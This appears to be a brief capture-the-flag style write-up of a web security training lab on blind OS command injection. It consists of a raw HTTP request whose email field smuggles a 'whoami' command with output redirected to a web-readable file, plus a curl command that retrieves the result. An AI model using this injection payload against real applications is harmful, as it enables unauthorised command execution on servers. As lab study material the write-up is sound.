# Lab: Blind OS command injection with output redirection

```bash
POST /feedback/submit HTTP/1.1
Host: ac951f091ea8e226c0c8180200550030.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Origin: https://ac951f091ea8e226c0c8180200550030.web-security-academy.net
Connection: close
Referer: https://ac951f091ea8e226c0c8180200550030.web-security-academy.net/feedback
Cookie: session=PudlI2ngqDXVcElyQBhHArsWdXeVxAT9

csrf=fSivSqDHuazA0vf0ZkYDvDNwwxldLWL4&name=test&email=%26whoami+>+/var/www/images/a.txt%26&subject=test&message=test
```

```bash
┌──(kali㉿kali)-[~]
└─$ curl https://ac951f091ea8e226c0c8180200550030.web-security-academy.net/image?filename=a.txt
peter-C0lZbJ
```

